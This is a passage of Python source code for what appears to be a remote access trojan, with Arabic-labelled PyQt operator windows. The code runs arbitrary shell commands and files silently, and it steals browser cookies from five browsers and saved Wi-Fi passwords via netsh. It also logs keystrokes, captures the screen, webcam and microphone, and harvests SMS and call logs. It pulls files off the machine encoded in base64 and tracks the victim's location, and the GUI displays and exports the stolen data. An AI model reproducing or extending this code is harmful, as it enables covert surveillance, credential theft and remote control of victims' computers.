            elif command.startswith("execute_process:"):
                process_path = command.replace("execute_process:", "")
                return self.execute_silent_process(process_path)

            elif command.startswith("delete_secure:"):
                file_path = command.replace("delete_secure:", "")
                return self.secure_delete_file(file_path)

            elif command == "restart_system":
                return self.restart_system()

            elif command.startswith("file_rename:"):
                parts = command.split(":", 2)
                if len(parts) == 3:
                    old_path = parts[1]
                    new_name = parts[2]
                    return self.rename_file(old_path, new_name)

            elif command.startswith("create_folder:"):
                folder_path = command.replace("create_folder:", "")
                return self.create_folder(folder_path)

            elif command == "start_live_screen":
                return self.start_live_screen_stream()

            elif command == "get_installed_software":
                return self.get_installed_software()

            elif command == "get_system_performance":
                return self.get_system_performance()

            elif command == "get_sms_messages":
                return self.get_sms_messages()

            elif command == "get_call_logs":
                return self.get_call_logs()

            elif command == "start_audio_stream":
                return self.start_audio_stream()

            elif command == "stop_audio_stream":
                return self.stop_audio_stream()

            else:
                return f"Unknown command: {command}"

        except Exception as e:
            return f"Error: {str(e)}"

    def get_real_sms_messages(self):
        """الحصول على الرسائل النصية الحقيقية"""
        try:
            sms_messages = self.sms_manager.get_real_sms_messages()
            return json.dumps(sms_messages, indent=2, ensure_ascii=False)
        except Exception as e:
            return f"SMS error: {str(e)}"

    def get_real_call_logs(self):
        """الحصول على سجل المكالمات الحقيقي"""
        try:
            call_logs = self.call_manager.get_real_call_logs()
            return json.dumps(call_logs, indent=2, ensure_ascii=False)
        except Exception as e:
            return f"Call logs error: {str(e)}"

    def get_sms_messages(self):
        """الدالة الأساسية للرسائل (للتوافق مع الكود القديم)"""
        return self.get_real_sms_messages()

    def get_call_logs(self):
        """الدالة الأساسية للمكالمات (للتوافق مع الكود القديم)"""
        return self.get_real_call_logs()

    def execute_system_command(self, cmd):
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30, encoding='utf-8',
                                    errors='ignore')
            output = result.stdout + result.stderr
            return output if output else "Command executed successfully (no output)"
        except subprocess.TimeoutExpired:
            return "Command timeout: took longer than 30 seconds"
        except Exception as e:
            return f"Command error: {str(e)}"

    def get_advanced_browser_cookies(self):
        try:
            cookies_data = {}
            browsers = ['chrome', 'firefox', 'edge', 'opera', 'brave']

            for browser in browsers:
                try:
                    browser_cookies = {}
                    if browser == 'chrome':
                        cj = browser_cookie3.chrome()
                    elif browser == 'firefox':
                        cj = browser_cookie3.firefox()
                    elif browser == 'edge':
                        cj = browser_cookie3.edge()
                    elif browser == 'opera':
                        cj = browser_cookie3.opera()
                    elif browser == 'brave':
                        cj = browser_cookie3.brave()

                    for cookie in cj:
                        browser_cookies[cookie.name] = {
                            'value': cookie.value,
                            'domain': cookie.domain,
                            'path': cookie.path,
                            'expires': getattr(cookie, 'expires', None),
                            'secure': getattr(cookie, 'secure', False)
                        }
                    if browser_cookies:
                        cookies_data[browser] = browser_cookies
                except Exception as e:
                    continue

            return json.dumps(cookies_data, indent=2, ensure_ascii=False)
        except Exception as e:
            return f"Advanced cookies error: {str(e)}"

    def take_realtime_screenshot(self):
        try:
            screenshot = ImageGrab.grab()
            screenshot_data = np.array(screenshot)

            # ضغط الصورة
            encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 80]
            result, encoded_img = cv2.imencode('.jpg', screenshot_data, encode_param)

            if result:
                encoded_data = base64.b64encode(encoded_img).decode('utf-8')
                return f"SCREENSHOT_DATA:{encoded_data}"
            return "Screenshot compression failed"
        except Exception as e:
            return f"Screenshot error: {str(e)}"

    def start_camera_stream(self):
        try:
            cap = cv2.VideoCapture(0)
            if cap.isOpened():
                ret, frame = cap.read()
                if ret:
                    # ضغط إطار الكاميرا
                    encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 70]
                    result, encoded_img = cv2.imencode('.jpg', frame, encode_param)
                    cap.release()

                    if result:
                        encoded_data = base64.b64encode(encoded_img).decode('utf-8')
                        return f"CAMERA_DATA:{encoded_data}"
            cap.release()
            return "Camera not available"
        except Exception as e:
            return f"Camera error: {str(e)}"

    def start_advanced_keylogger(self):
        try:
            self.keylogger_running = True
            self.keylogs = []

            def on_press(key):
                if self.keylogger_running:
                    try:
                        timestamp = datetime.now().strftime('%H:%M:%S')
                        key_str = str(key).replace("'", "")

                        if key_str.startswith("Key."):
                            key_str = f"[{key_str[4:].upper()}]"
                        elif key_str == 'Key.space':
                            key_str = " "
                        elif key_str == 'Key.enter':
                            key_str = "[ENTER]\n"
                        elif key_str == 'Key.backspace':
                            key_str = "[BACKSPACE]"
                        elif key_str == 'Key.tab':
                            key_str = "[TAB]"

                        log_entry = f"[{timestamp}] {key_str}"
                        self.keylogs.append(log_entry)

                        # الحفاظ على آخر 5000 ضغطة فقط
                        if len(self.keylogs) > 5000:
                            self.keylogs.pop(0)
                    except Exception as e:
                        pass

            self.listener = keyboard.Listener(on_press=on_press)
            self.listener.start()
            return "Advanced keylogger started successfully"
        except Exception as e:
            return f"Advanced keylogger error: {str(e)}"

    def stop_advanced_keylogger(self):
        try:
            self.keylogger_running = False
            if hasattr(self, 'listener'):
                self.listener.stop()
            return "Advanced keylogger stopped successfully"
        except Exception as e:
            return f"Keylogger stop error: {str(e)}"

    def get_advanced_keylogs(self):
        if self.keylogs:
            return "\n".join(self.keylogs[-1000:])
        return "No keylogs available"

    def get_advanced_location(self):
        try:
            location_data = {}

            # من IP
            try:
                g = geocoder.ip('me')
                if g.ok:
                    location_data['ip'] = g.ip
                    location_data['city'] = g.city
                    location_data['country'] = g.country
                    location_data['lat'] = g.lat
                    location_data['lng'] = g.lng
            except:
                pass

            return json.dumps(location_data, indent=2)
        except Exception as e:
            return f"Location error: {str(e)}"

    def get_advanced_wifi_passwords(self):
        try:
            system = platform.system()
            wifi_profiles = []

            if system == "Windows":
                try:
                    result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'],
                                            capture_output=True, text=True, timeout=15)

                    profiles = []
                    for line in result.stdout.split('\n'):
                        if 'All User Profile' in line:
                            profile_name = line.split(':')[1].strip()
                            profiles.append(profile_name)

                    for profile in profiles:
                        try:
                            password_result = subprocess.run([
                                'netsh', 'wlan', 'show', 'profile',
                                f'name={profile}', 'key=clear'
                            ], capture_output=True, text=True, timeout=10)

                            password = 'Not found'
                            for line in password_result.stdout.split('\n'):
                                if 'Key Content' in line:
                                    password = line.split(':')[1].strip()
                                    break

                            wifi_profiles.append({
                                'ssid': profile,
                                'password': password
                            })
                        except:
                            continue

                except Exception as e:
                    return f"Windows WiFi error: {str(e)}"

            return json.dumps(wifi_profiles, indent=2)
        except Exception as e:
            return f"Advanced WiFi error: {str(e)}"

    def get_detailed_system_info(self):
        try:
            system_info = {
                'platform': platform.system(),
                'platform_release': platform.release(),
                'platform_version': platform.version(),
                'architecture': platform.machine(),
                'processor': platform.processor(),
                'username': getpass.getuser(),
                'hostname': platform.node(),
                'python_version': platform.python_version(),
                'cpu_count': os.cpu_count(),
                'total_ram': f"{psutil.virtual_memory().total / (1024 ** 3):.2f} GB",
                'boot_time': datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')
            }
            return json.dumps(system_info, indent=2, default=str)
        except Exception as e:
            return f"System info error: {str(e)}"

    def advanced_list_files(self, path):
        try:
            if not os.path.exists(path):
                return f"Path does not exist: {path}"

            files = []
            for item in os.listdir(path):
                try:
                    item_path = os.path.join(path, item)
                    stat_info = os.stat(item_path)

                    file_info = {
                        'name': item,
                        'is_dir': os.path.isdir(item_path),
                        'size': stat_info.st_size if os.path.isfile(item_path) else 0,
                        'modified': stat_info.st_mtime,
                        'absolute_path': os.path.abspath(item_path)
                    }
                    files.append(file_info)
                except:
                    continue

            return json.dumps(files, default=str)
        except Exception as e:
            return f"File list error: {str(e)}"

    def advanced_download_file(self, file_path):
        try:
            if os.path.exists(file_path) and os.path.isfile(file_path):
                with open(file_path, 'rb') as f:
                    file_content = f.read()

                encoded_content = base64.b64encode(file_content).decode('utf-8')
                file_name = os.path.basename(file_path)
                file_size = len(file_content)

                return f"FILE_DATA:{file_name}:{file_size}:{encoded_content}"
            return f"File not found or is directory: {file_path}"
        except Exception as e:
            return f"Download error: {str(e)}"

    def advanced_upload_file(self, file_path, file_data):
        try:
            decoded_data = base64.b64decode(file_data)
            os.makedirs(os.path.dirname(file_path), exist_ok=True)

            with open(file_path, 'wb') as f:
                f.write(decoded_data)

            file_size = len(decoded_data)
            return f"File uploaded successfully: {file_path} ({file_size} bytes)"
        except Exception as e:
            return f"Upload error: {str(e)}"

    def get_running_applications(self):
        try:
            applications = []
            for proc in psutil.process_iter(['pid', 'name', 'memory_percent', 'cpu_percent']):
                try:
                    applications.append(proc.info)
                except:
                    continue
            return json.dumps(applications, default=str)
        except Exception as e:
            return f"Applications error: {str(e)}"

    def get_network_information(self):
        try:
            network_info = {
                'hostname': platform.node(),
                'ip_address': socket.gethostbyname(socket.gethostname())
            }
            return json.dumps(network_info, indent=2)
        except Exception as e:
            return f"Network info error: {str(e)}"

    def execute_silent_process(self, process_path):
        try:
            if os.path.exists(process_path):
                if platform.system() == "Windows":
                    subprocess.Popen([process_path], shell=True,
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                else:
                    subprocess.Popen([process_path],
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return f"Process executed silently: {process_path}"
            return "Process path does not exist"
        except Exception as e:
            return f"Process execution error: {str(e)}"

    def secure_delete_file(self, file_path):
        try:
            if os.path.exists(file_path):
                if platform.system() == "Windows":
                    subprocess.run(f'del /f /q "{file_path}"', shell=True, capture_output=True)
                else:
                    os.remove(file_path)
                return f"File securely deleted: {file_path}"
            return "File not found"
        except Exception as e:
            return f"Secure delete error: {str(e)}"

    def restart_system(self):
        try:
            if platform.system() == "Windows":
                os.system("shutdown /r /t 0")
            else:
                os.system("shutdown -r now")
            return "System restart initiated"
        except Exception as e:
            return f"Restart error: {str(e)}"

    def rename_file(self, old_path, new_name):
        try:
            if os.path.exists(old_path):
                directory = os.path.dirname(old_path)
                new_path = os.path.join(directory, new_name)
                os.rename(old_path, new_path)
                return f"File renamed from {os.path.basename(old_path)} to {new_name}"
            return "File not found"
        except Exception as e:
            return f"Rename error: {str(e)}"

    def create_folder(self, folder_path):
        try:
            os.makedirs(folder_path, exist_ok=True)
            return f"Folder created successfully: {folder_path}"
        except Exception as e:
            return f"Folder creation error: {str(e)}"

    def start_live_screen_stream(self):
        try:
            screenshot = ImageGrab.grab()
            screenshot_data = np.array(screenshot)

            encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 60]
            result, encoded_img = cv2.imencode('.jpg', screenshot_data, encode_param)

            if result:
                encoded_data = base64.b64encode(encoded_img).decode('utf-8')
                return f"LIVE_SCREEN:{encoded_data}"
            return "Live screen capture failed"
        except Exception as e:
            return f"Live screen error: {str(e)}"

    def get_installed_software(self):
        try:
            software_list = []
            if platform.system() == "Windows":
                try:
                    result = subprocess.run(['wmic', 'product', 'get', 'name,version'],
                                            capture_output=True, text=True, timeout=30)
                    lines = result.stdout.split('\n')
                    for line in lines[1:]:
                        if line.strip():
                            software_list.append(line.strip())
                except:
                    pass
            return json.dumps(software_list, indent=2)
        except Exception as e:
            return f"Software list error: {str(e)}"

    def get_system_performance(self):
        try:
            performance_data = {
                'cpu_percent': psutil.cpu_percent(interval=1),
                'memory_percent': psutil.virtual_memory().percent,
                'disk_usage': psutil.disk_usage('/').percent,
                'network_io': psutil.net_io_counters()._asdict()
            }
            return json.dumps(performance_data, indent=2, default=str)
        except Exception as e:
            return f"Performance error: {str(e)}"

    def start_audio_stream(self):
        try:
            self.audio_streaming = True
            CHUNK = 1024
            FORMAT = pyaudio.paInt16
            CHANNELS = 1
            RATE = 44100

            self.audio = pyaudio.PyAudio()
            self.stream = self.audio.open(format=FORMAT, channels=CHANNELS,
                                          rate=RATE, input=True,
                                          frames_per_buffer=CHUNK)

            # بدء تسجيل الصوت في thread منفصل
            self.audio_thread = threading.Thread(target=self.record_audio)
            self.audio_thread.daemon = True
            self.audio_thread.start()

            return "Audio streaming started successfully"
        except Exception as e:
            return f"Audio stream error: {str(e)}"

    def record_audio(self):
        try:
            frames = []
            while self.audio_streaming:
                data = self.stream.read(1024)
                frames.append(data)

                # إرسال البيانات كل 50 إطار
                if len(frames) >= 50:
                    audio_data = b''.join(frames)
                    encoded_audio = base64.b64encode(audio_data).decode('utf-8')
                    # يمكن إرسال البيانات هنا إذا كان هناك اتصال
                    frames = []

        except Exception as e:
            print(f"Audio recording error: {e}")

    def stop_audio_stream(self):
        try:
            self.audio_streaming = False
            if hasattr(self, 'stream'):
                self.stream.stop_stream()
                self.stream.close()
            if hasattr(self, 'audio'):
                self.audio.terminate()
            return "Audio streaming stopped successfully"
        except Exception as e:
            return f"Audio stop error: {str(e)}"

    def cleanup(self):
        self.running = False
        self.keylogger_running = False
        self.audio_streaming = False
        try:
            if hasattr(self, 'listener'):
                self.listener.stop()
            if hasattr(self, 'stream'):
                self.stream.stop_stream()
                self.stream.close()
            if hasattr(self, 'audio'):
                self.audio.terminate()
            if self.persistent_id:
                self.server_app.persistent_manager.remove_connection(self.persistent_id)
            self.client_socket.close()
        except:
            pass


# ==================== نوافذ GUI المتقدمة ====================

class AdvancedThemeSelector(QDialog):
    def __init__(self, theme_manager, parent=None):
        super().__init__(parent)
        self.theme_manager = theme_manager
        self.parent = parent
        self.setWindowTitle("اختيار السمة اللونية")
        self.setGeometry(550, 550, 500, 400)
        self.setup_ui()

    def setup_ui(self):
        layout = QVBoxLayout()

        title_label = QLabel("اختيار السمة اللونية المتقدمة")
        title_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        title_label.setStyleSheet("font-size: 18px; font-weight: bold; padding: 15px;")
        layout.addWidget(title_label)

        preview_group = QGroupBox("معاينة السمة")
        preview_layout = QVBoxLayout(preview_group)

        self.preview_widget = QWidget()
        self.preview_widget.setMinimumHeight(150)
        self.preview_widget.setStyleSheet("background-color: #1e1e1e; border: 2px solid #ff4444; border-radius: 8px;")

        preview_inner = QVBoxLayout(self.preview_widget)
        preview_label = QLabel("هذه معاينة للسمة المختارة")
        preview_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        preview_label.setStyleSheet("color: #ff4444; font-size: 14px; padding: 20px;")
        preview_inner.addWidget(preview_label)

        preview_layout.addWidget(self.preview_widget)
        layout.addWidget(preview_group)

        theme_group = QGroupBox("السمات المتاحة:")
        theme_layout = QGridLayout(theme_group)

        themes = [
            ("أسود وأحمر مضيء", "red_dark"),
            ("أسود وأزرق مضيء", "blue_dark"),
            ("أسود وأخضر مضيء", "green_dark"),
            ("أسود وذهبي مضيء", "gold_dark")
        ]

        self.theme_buttons = QButtonGroup(self)

        for i, (theme_name, theme_id) in enumerate(themes):
            radio = QRadioButton(theme_name)
            radio.theme_id = theme_id
            self.theme_buttons.addButton(radio)
            theme_layout.addWidget(radio, i // 2, i % 2)

            if theme_id == "red_dark":
                radio.setChecked(True)

            radio.toggled.connect(self.update_preview)

        layout.addWidget(theme_group)

        button_layout = QHBoxLayout()
        apply_btn = QPushButton("تطبيق السمة")
        cancel_btn = QPushButton("إلغاء")

        apply_btn.setMinimumHeight(40)
        cancel_btn.setMinimumHeight(40)

        button_layout.addWidget(apply_btn)
        button_layout.addWidget(cancel_btn)
        layout.addLayout(button_layout)

        self.setLayout(layout)

        apply_btn.clicked.connect(self.apply_theme)
        cancel_btn.clicked.connect(self.close)

    def update_preview(self):
        selected_button = self.theme_buttons.checkedButton()
        if selected_button:
            theme_id = selected_button.theme_id
            theme = self.theme_manager.themes.get(theme_id)

            if theme:
                self.preview_widget.setStyleSheet(f"""
                    background-color: {theme['background']}; 
                    border: 2px solid {theme['border']}; 
                    border-radius: 8px;
                """)

    def apply_theme(self):
        selected_button = self.theme_buttons.checkedButton()
        if selected_button:
            theme_id = selected_button.theme_id
            self.theme_manager.apply_theme(theme_id, self.parent)
            QMessageBox.information(self, "تم التطبيق", f"تم تطبيق السمة {theme_id} بنجاح!")
            self.close()


class RealTimeKeyloggerWindow(QDialog):
    def __init__(self, client_handler, parent=None):
        super().__init__(parent)
        self.client_handler = client_handler
        self.setWindowTitle("مسجل الضربات - الوقت الحقيقي")
        self.setGeometry(450, 450, 800, 600)
        self.setup_ui()
        self.setup_realtime_updates()

    def setup_ui(self):
        layout = QVBoxLayout()

        control_layout = QHBoxLayout()

        self.start_btn = QPushButton("بدء التسجيل الحقيقي")
        self.stop_btn = QPushButton("إيقاف التسجيل")
        self.refresh_btn = QPushButton("تحديث فوري")
        self.save_btn = QPushButton("حفظ السجل")
        self.clear_btn = QPushButton("مسح الكل")

        control_layout.addWidget(self.start_btn)
        control_layout.addWidget(self.stop_btn)
        control_layout.addWidget(self.refresh_btn)
        control_layout.addWidget(self.save_btn)
        control_layout.addWidget(self.clear_btn)

        layout.addLayout(control_layout)

        stats_layout = QHBoxLayout()

        self.keystrokes_label = QLabel("الضربات المسجلة: 0")
        self.recording_time_label = QLabel("زمن التسجيل: 00:00:00")
        self.last_key_label = QLabel("آخر ضغطة: -")
        self.status_label = QLabel("الحالة: متوقف")

        stats_layout.addWidget(self.keystrokes_label)
        stats_layout.addWidget(self.recording_time_label)
        stats_layout.addWidget(self.last_key_label)
        stats_layout.addWidget(self.status_label)

        layout.addLayout(stats_layout)

        log_group = QGroupBox("سجل الضربات - الوقت الحقيقي")
        log_layout = QVBoxLayout(log_group)

        self.log_text = QTextEdit()
        self.log_text.setPlaceholderText("سجل الضربات سيظهر هنا بشكل حيوي...")
        self.log_text.setFont(QFont("Consolas", 10))
        self.log_text.setReadOnly(True)

        log_layout.addWidget(self.log_text)
        layout.addWidget(log_group)

        self.setLayout(layout)

        self.start_btn.clicked.connect(self.start_realtime_logging)
        self.stop_btn.clicked.connect(self.stop_realtime_logging)
        self.refresh_btn.clicked.connect(self.instant_refresh)
        self.save_btn.clicked.connect(self.save_logs)
        self.clear_btn.clicked.connect(self.clear_logs)

        self.recording_timer = QTimer()
        self.recording_timer.timeout.connect(self.update_recording_time)
        self.recording_start_time = None

        self.stop_btn.setEnabled(False)

    def setup_realtime_updates(self):
        self.update_timer = QTimer()
        self.update_timer.timeout.connect(self.realtime_refresh)

    def start_realtime_logging(self):
        result = self.client_handler.execute_enhanced_command("start_advanced_keylogger")
        self.log_text.append(f"{result} - {datetime.now().strftime('%H:%M:%S')}")

        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.status_label.setText("الحالة: تسجيل نشط")
        self.status_label.setStyleSheet("color: #00ff00; font-weight: bold;")

        self.recording_start_time = datetime.now()
        self.recording_timer.start(1000)
        self.update_timer.start(2000)

        QMessageBox.information(self, "بدء التسجيل", "تم بدء التسجيل الحقيقي للضربات!")

    def stop_realtime_logging(self):
        result = self.client_handler.execute_enhanced_command("stop_advanced_keylogger")
        self.log_text.append(f"{result} - {datetime.now().strftime('%H:%M:%S')}")

        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.status_label.setText("الحالة: متوقف")
        self.status_label.setStyleSheet("color: #ff4444; font-weight: bold;")

        self.recording_timer.stop()
        self.update_timer.stop()

        QMessageBox.information(self, "إيقاف التسجيل", "تم إيقاف التسجيل!")

    def realtime_refresh(self):
        keylogs = self.client_handler.execute_enhanced_command("get_advanced_keylogs")
        if keylogs and keylogs != "No keylogs available":
            current_content = self.log_text.toPlainText()
            if keylogs not in current_content:
                self.log_text.setText(keylogs)

                lines = keylogs.split('\n')
                self.keystrokes_label.setText(f"الضربات المسجلة: {len(lines)}")

                if lines:
                    self.last_key_label.setText(f"آخر ضغطة: {lines[-1][-20:]}")

    def instant_refresh(self):
        self.realtime_refresh()

    def update_recording_time(self):
        if self.recording_start_time:
            elapsed = datetime.now() - self.recording_start_time
            hours, remainder = divmod(int(elapsed.total_seconds()), 3600)
            minutes, seconds = divmod(remainder, 60)
            self.recording_time_label.setText(f"زمن التسجيل: {hours:02d}:{minutes:02d}:{seconds:02d}")

    def save_logs(self):
        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "حفظ سجل الضربات",
            f"advanced_keylogs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
            "Text Files (*.txt)"
        )
        if file_path:
            try:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(self.log_text.toPlainText())
                QMessageBox.information(self, "تم الحفظ", "تم حفظ سجل الضربات بنجاح!")
            except Exception as e:
                QMessageBox.critical(self, "خطأ", f"فشل في الحفظ: {str(e)}")

    def clear_logs(self):
        reply = QMessageBox.question(
            self,
            "تأكيد المسح",
            "هل أنت متأكد من مسح سجل الضربات بالكامل؟",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
        )
        if reply == QMessageBox.StandardButton.Yes:
            self.log_text.clear()
            self.keystrokes_label.setText("الضربات المسجلة: 0")
            self.recording_time_label.setText("زمن التسجيل: 00:00:00")
            self.last_key_label.setText("آخر ضغطة: -")


class GPSLocationWindow(QDialog):
    def __init__(self, client_handler, parent=None):
        super().__init__(parent)
        self.client_handler = client_handler
        self.setWindowTitle("تتبع الموقع - نظام GPS")
        self.setGeometry(500, 500, 900, 700)
        self.setup_ui()
        self.refresh_location()

    def setup_ui(self):
        layout = QVBoxLayout()

        control_layout = QHBoxLayout()

        self.get_location_btn = QPushButton("تحديث الموقع الحالي")
        self.refresh_map_btn = QPushButton("تحديث الخريطة")
        self.open_browser_btn = QPushButton("فتح في خرائط جوجل")
        self.export_btn = QPushButton("تصدير بيانات الموقع")

        control_layout.addWidget(self.get_location_btn)
        control_layout.addWidget(self.refresh_map_btn)
        control_layout.addWidget(self.open_browser_btn)
        control_layout.addWidget(self.export_btn)

        layout.addLayout(control_layout)

        info_group = QGroupBox("معلومات الموقع التفصيلية")
        info_layout = QGridLayout(info_group)

        info_layout.addWidget(QLabel("عنوان IP:"), 0, 0)
        self.ip_label = QLabel("جاري التحميل...")
        info_layout.addWidget(self.ip_label, 0, 1)

        info_layout.addWidget(QLabel("المدينة:"), 0, 2)
        self.city_label = QLabel("جاري التحميل...")
        info_layout.addWidget(self.city_label, 0, 3)

        info_layout.addWidget(QLabel("الدولة:"), 1, 0)
        self.country_label = QLabel("جاري التحميل...")
        info_layout.addWidget(self.country_label, 1, 1)

        info_layout.addWidget(QLabel("الإحداثيات:"), 1, 2)
        self.coords_label = QLabel("جاري التحميل...")
        info_layout.addWidget(self.coords_label, 1, 3)

        layout.addWidget(info_group)

        map_group = QGroupBox("الخريطة التفاعلية")
        map_layout = QVBoxLayout(map_group)

        self.map_display = QTextEdit()
        self.map_display.setReadOnly(True)
        self.map_display.setMinimumHeight(300)
        self.map_display.setHtml("""
            <html>
            <body style='text-align: center; padding: 50px; font-family: Arial, sans-serif;'>
                <h2>نظام تتبع الموقع</h2>
                <p>جاري تحميل بيانات الموقع والخرائط...</p>
            </body>
            </html>
        """)

        map_layout.addWidget(self.map_display)
        layout.addWidget(map_group)

        self.setLayout(layout)

        self.get_location_btn.clicked.connect(self.refresh_location)
        self.refresh_map_btn.clicked.connect(self.refresh_map)
        self.open_browser_btn.clicked.connect(self.open_in_browser)
        self.export_btn.clicked.connect(self.export_location_data)

    def refresh_location(self):
        try:
            location_json = self.client_handler.execute_enhanced_command("get_gps_location")
            if location_json and not location_json.startswith("Location error"):
                location_data = json.loads(location_json)

                self.ip_label.setText(location_data.get('ip', 'غير معروف'))
                self.city_label.setText(location_data.get('city', 'غير معروف'))
                self.country_label.setText(location_data.get('country', 'غير معروف'))

                lat = location_data.get('lat', 0)
                lng = location_data.get('lng', 0)
                self.coords_label.setText(f"{lat:.4f}, {lng:.4f}")

                self.update_advanced_map(lat, lng)

                QMessageBox.information(self, "تم التحديث", "تم تحديث بيانات الموقع بنجاح!")
            else:
                QMessageBox.warning(self, "تحذير", "فشل في الحصول على بيانات الموقع")

        except Exception as e:
            QMessageBox.critical(self, "خطأ", f"خطأ في تحديث الموقع: {str(e)}")

    def update_advanced_map(self, lat, lng):
        if lat != 0 and lng != 0:
            map_html = f"""
            <html>
            <head>
                <style>
                    body {{ 
                        font-family: 'Segoe UI', Arial, sans-serif; 
                        text-align: center; 
                        padding: 20px;
                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                        color: white;
                    }}
                    .container {{
                        background: rgba(255,255,255,0.1);
                        border-radius: 15px;
                        padding: 20px;
                    }}
                </style>
            </head>
            <body>
                <div class="container">
                    <h2>الموقع الحالي للعميل</h2>

                    <h3>الإحداثيات الدقيقة</h3>
                    <p style="font-size: 18px; font-weight: bold;">
                        خط العرض: {lat:.6f}<br>
                        خط الطول: {lng:.6f}
                    </p>

                    <h3>الخريطة التفاعلية</h3>
                    <p>لرؤية الخريطة التفاعلية، اضغط على أحد الروابط أدناه:</p>

                    <a href="https://www.google.com/maps?q={lat},{lng}&z=15" target="_blank" style="color: white; background: #ff4444; padding: 10px 20px; border-radius: 25px; text-decoration: none; margin: 10px; display: inline-block;">
                        فتح في خرائط جوجل
                    </a>
                </div>
            </body>
            </html>
            """
            self.map_display.setHtml(map_html)

    def refresh_map(self):
        self.refresh_location()

    def open_in_browser(self):
        coords_text = self.coords_label.text()
        if ',' in coords_text:
            try:
                lat, lng = map(float, coords_text.split(','))
                url = f"https://www.google.com/maps?q={lat},{lng}&z=15"
                QDesktopServices.openUrl(QUrl(url))
            except:
                QMessageBox.warning(self, "تحذير", "لا يمكن فتح الخريطة: إحداثيات غير صالحة")

    def export_location_data(self):
        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "حفظ بيانات الموقع",
            f"location_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
            "JSON Files (*.json)"
        )
        if file_path:
            try:
                location_data = {
                    'ip': self.ip_label.text(),
                    'city': self.city_label.text(),
                    'country': self.country_label.text(),
                    'coordinates': self.coords_label.text(),
                    'timestamp': datetime.now().isoformat()
                }

                with open(file_path, 'w', encoding='utf-8') as f:
                    json.dump(location_data, f, indent=2, ensure_ascii=False)

                QMessageBox.information(self, "تم التصدير", "تم حفظ بيانات الموقع بنجاح!")
            except Exception as e:
                QMessageBox.critical(self, "خطأ", f"فشل في الحفظ: {str(e)}")


class WiFiManagerWindow(QDialog):
    def __init__(self, client_handler, parent=None):
        super().__init__(parent)
        self.client_handler = client_handler
        self.setWindowTitle("مدير شبكات WiFi المتقدم")
        self.setGeometry(500, 500, 900, 650)
        self.setup_ui()
        self.load_wifi_profiles()

    def setup_ui(self):
        layout = QVBoxLayout()

        control_layout = QHBoxLayout()

        self.refresh_btn = QPushButton("تحديث القائمة")
        self.export_btn = QPushButton("تصدير كلمات المرور")
        self.show_hide_btn = QPushButton("إظهار/إخفاء كلمات المرور")

        control_layout.addWidget(self.refresh_btn)
        control_layout.addWidget(self.export_btn)
        control_layout.addWidget(self.show_hide_btn)
        control_layout.addStretch()

        layout.addLayout(control_layout)

        table_group = QGroupBox("شبكات WiFi المحفوظة")
        table_layout = QVBoxLayout(table_group)

        self.wifi_table = QTableWidget()
        self.wifi_table.setColumnCount(2)
        self.wifi_table.setHorizontalHeaderLabels([
            "اسم الشبكة (SSID)", "كلمة المرور"
        ])

        header = self.wifi_table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)

        table_layout.addWidget(self.wifi_table)
        layout.addWidget(table_group)

        self.setLayout(layout)

        self.refresh_btn.clicked.connect(self.load_wifi_profiles)
        self.export_btn.clicked.connect(self.export_wifi_data)
        self.show_hide_btn.clicked.connect(self.toggle_passwords_visibility)

        self.passwords_hidden = True

    def load_wifi_profiles(self):
        try:
            wifi_json = self.client_handler.execute_enhanced_command("get_wifi_profiles")
            self.display_advanced_wifi_data(wifi_json)
        except Exception as e:
            QMessageBox.critical(self, "خطأ", f"فشل في تحميل بيانات WiFi: {str(e)}")

    def display_advanced_wifi_data(self, wifi_json):
        try:
            if wifi_json.startswith("["):
                wifi_data = json.loads(wifi_json)
                self.wifi_table.setRowCount(len(wifi_data))

                for row, wifi in enumerate(wifi_data):
                    ssid_item = QTableWidgetItem(wifi.get('ssid', 'N/A'))
                    self.wifi_table.setItem(row, 0, ssid_item)

                    password = wifi.get('password', '')
                    password_item = QTableWidgetItem()

                    if password and password != 'Not found':
                        password_item.setData(Qt.ItemDataRole.UserRole, password)
                        if self.passwords_hidden:
                            password_item.setText("••••••••••")
                        else:
                            password_item.setText(password)
                    else:
                        password_item.setText("مفتوحة / غير معروفة")

                    self.wifi_table.setItem(row, 1, password_item)

            else:
                self.show_error_message(wifi_json)

        except Exception as e:
            self.show_error_message(str(e))

    def toggle_passwords_visibility(self):
        self.passwords_hidden = not self.passwords_hidden

        for row in range(self.wifi_table.rowCount()):
            item = self.wifi_table.item(row, 1)
            if item:
                real_password = item.data(Qt.ItemDataRole.UserRole)
                if real_password:
                    if self.passwords_hidden:
                        item.setText("••••••••••")
                    else:
                        item.setText(real_password)

    def export_wifi_data(self):
        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "حفظ بيانات WiFi",
            f"wifi_profiles_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
            "Text Files (*.txt)"
        )
        if file_path:
            try:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write("كلمات مرور شبكات WiFi\n")
                    f.write("=" * 50 + "\n")
                    for row in range(self.wifi_table.rowCount()):
                        ssid = self.wifi_table.item(row, 0).text()
                        password_item = self.wifi_table.item(row, 1)
                        password = password_item.data(Qt.ItemDataRole.UserRole) or password_item.text()
                        f.write(f"SSID: {ssid}\nPassword: {password}\n{'-' * 30}\n")

                QMessageBox.information(self, "تم التصدير", "تم حفظ بيانات WiFi بنجاح!")
            except Exception as e:
